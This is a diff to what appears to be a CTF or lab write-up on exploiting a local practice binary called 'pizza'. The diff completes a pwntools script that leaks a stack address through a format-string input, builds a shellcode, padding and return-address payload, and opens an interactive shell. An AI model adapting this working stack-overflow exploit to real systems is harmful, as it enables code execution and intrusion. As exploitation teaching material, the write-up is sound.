@@ -16,7 +16,7 @@ To pull this off we need 3 things:
 2. We need to inject padding bytes plus a new return address, plus some shellcode.
 3. We need to be able to predict at what address our shellcode will be so we can return to it.
 
-````python3
+```python3
 #!/usr/bin/env python3
 
 from pwn import *
@@ -56,31 +56,40 @@ shellcode = asm(shellcraft.amd64.linux.sh())
 
 
 input1 = b"%p %p %p %p %p %p %p %p %p"
-# SHELL CODE + "A"*?? + NEW RET_ADDRESS
-input2 = shellcode + b"A"*100
+
 
 
 victim = process("./pizza")
 
+# Recieve Welcome Message
 print(str(victim.recvline(), "latin-1"))
+
+# Send Name
 victim.sendline(input1)
-print(str(victim.recvline(), "latin-1"))
+# Recieve stack address leak output
+leak = str(victim.recvline(), "latin-1")
+print(leak)
+
+# Send numberof pizzas and recieve output
 victim.sendline(b"10")
 print(str(victim.recvline(), "latin-1"))
+
+# SHELL CODE + "A"*?? + NEW RET_ADDRESS
+retAddr = int(leak.split(" ")[7], 16) - 112
+input2 = shellcode + b"A"*88 + retAddr.to_bytes(8, 'little')
+
 victim.sendline(input2)
-print(str(victim.recvline(), "latin-1"))
+#print(str(victim.recvline(), "latin-1"))
 
-victim.wait()
-#victim.interactive()
 
-core = victim.corefile
+victim.interactive()
+#core = victim.corefile
 
-printStack(core)
+#printStack(core)
 
 # print(disasm(core.read(core.rip, 8)))
 # print( core.read( core.rsp, 100))
 
 
 exit()
-
 ```
